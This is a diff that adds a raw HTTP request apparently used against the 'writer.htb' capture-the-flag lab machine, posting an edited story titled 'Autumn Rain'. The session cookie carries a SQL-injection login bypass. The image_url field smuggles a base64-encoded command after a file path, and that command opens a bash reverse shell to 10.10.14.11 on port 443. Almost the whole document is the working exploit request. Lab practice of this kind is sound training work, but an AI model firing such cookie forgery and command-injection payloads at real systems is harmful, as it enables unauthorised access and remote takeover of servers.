@@ -1,0 +1,45 @@
+POST /dashboard/stories/edit/2 HTTP/1.1
+Host: writer.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------36635219755055419874074262897
+Content-Length: 8480
+Origin: http://writer.htb
+Connection: close
+Referer: http://writer.htb/dashboard/stories/edit/2
+Cookie: session=eyJ1c2VyIjoiJ3x8dHJ1ZS0tIDIifQ.YQ30dg.X6fAa5Mx06aS_1oRx5sX9zX71IE
+Upgrade-Insecure-Requests: 1
+
+-----------------------------36635219755055419874074262897
+Content-Disposition: form-data; name="title"
+
+Autumn Rain
+-----------------------------36635219755055419874074262897
+Content-Disposition: form-data; name="tagline"
+
+#Fiction
+-----------------------------36635219755055419874074262897
+Content-Disposition: form-data; name="image"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------36635219755055419874074262897
+Content-Disposition: form-data; name="image_url"
+
+file:///var/www/writer.htb/writer/static/img/bb.jpg; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS80NDMgMD4mMSc= |base64 -d |bash ;#
+
+
+-----------------------------36635219755055419874074262897
+Content-Disposition: form-data; name="content"
+
+Have you ever had this feeling? Like you’re a helium balloon with your string cut. A rotting piece of wood adrift in the vast ocean.
+
+Does saying it like that make me sound too pretentious? Thinking I’m some kind of literary youth. Of course I’m not. I’m just sad. Sad people tend to be under the impression that they’ve been possessed by Li Bai and suddenly know the gruesome secrets of the universe through a few lines of poetry.
+
+(SNIP)
+#############################################
+#############################################
+##
+##
